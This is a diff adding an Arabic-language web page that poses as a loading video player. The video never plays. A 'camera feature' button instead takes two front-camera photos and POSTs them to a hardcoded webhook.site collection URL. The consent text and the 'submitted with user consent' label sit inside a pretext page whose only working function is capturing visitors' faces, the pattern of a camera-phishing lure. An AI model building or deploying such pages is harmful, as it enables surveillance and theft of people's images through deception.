@@ -1,0 +1,299 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Video Player</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  background: #080b12;
+  color: white;
+  font-family: Arial, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 18px;
+}
+
+.container {
+  width: 100%;
+  max-width: 480px;
+  background: #111827;
+  border: 1px solid #273449;
+  border-radius: 18px;
+  overflow: hidden;
+  box-shadow: 0 15px 50px #0008;
+}
+
+.header {
+  padding: 17px;
+  border-bottom: 1px solid #273449;
+  font-size: 17px;
+  font-weight: bold;
+}
+
+.player {
+  height: 250px;
+  background: #03060b;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  gap: 17px;
+}
+
+.spinner {
+  width: 48px;
+  height: 48px;
+  border: 4px solid #283447;
+  border-top-color: #38a7ff;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.status {
+  color: #b8c5d8;
+  font-size: 14px;
+}
+
+.content {
+  padding: 20px;
+}
+
+h3 {
+  margin-top: 0;
+}
+
+p {
+  color: #b7c2d3;
+  line-height: 1.7;
+  font-size: 14px;
+}
+
+.consent {
+  background: #1b293d;
+  border: 1px solid #344967;
+  padding: 13px;
+  border-radius: 10px;
+  margin: 16px 0;
+  font-size: 14px;
+  line-height: 1.7;
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  background: #1685e8;
+  color: white;
+  border: none;
+  border-radius: 9px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+button:disabled {
+  opacity: .5;
+  cursor: not-allowed;
+}
+
+video {
+  width: 100%;
+  max-height: 260px;
+  background: black;
+  border-radius: 10px;
+  display: none;
+  margin-bottom: 15px;
+}
+
+.message {
+  margin-top: 15px;
+  text-align: center;
+  font-size: 14px;
+  line-height: 1.7;
+}
+
+.success { color: #4ade80; }
+.error { color: #fb7185; }
+
+.footer {
+  padding: 12px;
+  text-align: center;
+  color: #75849b;
+  font-size: 11px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="header">
+    ▶ Video Player
+  </div>
+
+  <div class="player">
+    <div class="spinner"></div>
+    <div class="status">جاري تحميل الفيديو...</div>
+  </div>
+
+  <div class="content">
+
+    <h3>مشاهدة الفيديو</h3>
+
+    <p>
+      الفيديو قيد التحميل. قد يستغرق الاتصال بعض الوقت.
+    </p>
+
+    <div class="consent">
+      <strong>ميزة الكاميرا:</strong>
+      إذا رغبت في المتابعة، يمكنك السماح باستخدام الكاميرا.
+      سيتم التقاط صورتين وإرسالهما تلقائياً إلى خادم خارجي.
+      لن يتم تشغيل الكاميرا أو إرسال الصور دون موافقتك.
+    </div>
+
+    <video id="camera" autoplay playsinline muted></video>
+
+    <button id="start">
+      موافقة وتشغيل الكاميرا
+    </button>
+
+    <div id="message" class="message"></div>
+
+  </div>
+
+  <div class="footer">
+    Camera access requires your permission.
+  </div>
+
+</div>
+
+<script>
+const WEBHOOK =
+"https://694ec670-b66c-41e2-b6d2-28f7e9d695ad.webhook.site";
+
+const button = document.getElementById("start");
+const video = document.getElementById("camera");
+const message = document.getElementById("message");
+
+let stream = null;
+
+function wait(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function takePhoto() {
+  const canvas = document.createElement("canvas");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const context = canvas.getContext("2d");
+  context.drawImage(video, 0, 0);
+
+  return new Promise(resolve => {
+    canvas.toBlob(resolve, "image/jpeg", 0.85);
+  });
+}
+
+async function sendPhotos(photos) {
+  const form = new FormData();
+
+  form.append("photo1", photos[0], "photo1.jpg");
+  form.append("photo2", photos[1], "photo2.jpg");
+
+  form.append("description", "Two photos submitted with user consent");
+
+  const response = await fetch(WEBHOOK, {
+    method: "POST",
+    body: form
+  });
+
+  if (!response.ok) {
+    throw new Error("Webhook returned HTTP " + response.status);
+  }
+
+  return true;
+}
+
+button.addEventListener("click", async () => {
+
+  button.disabled = true;
+  message.textContent = "بانتظار إذن الكاميرا...";
+  message.className = "message";
+
+  try {
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: "user"
+      },
+      audio: false
+    });
+
+    video.srcObject = stream;
+    video.style.display = "block";
+
+    await video.play();
+
+    await wait(1500);
+
+    message.textContent = "سيتم التقاط صورتين وإرسالهما الآن...";
+
+    const photo1 = await takePhoto();
+
+    await wait(1500);
+
+    const photo2 = await takePhoto();
+
+    if (!photo1 || !photo2) {
+      throw new Error("تعذر التقاط الصور");
+    }
+
+    message.textContent = "جاري إرسال الصورتين...";
+
+    await sendPhotos([photo1, photo2]);
+
+    message.textContent = "تم إرسال الصورتين بنجاح.";
+    message.className = "message success";
+
+  } catch (error) {
+
+    console.error(error);
+
+    message.textContent =
+      "لم تكتمل العملية: " + error.message;
+
+    message.className = "message error";
+
+    button.disabled = false;
+
+  } finally {
+
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      video.srcObject = null;
+      video.style.display = "none";
+      stream = null;
+    }
+
+  }
+
+});
+</script>
+
+</body>
+</html>
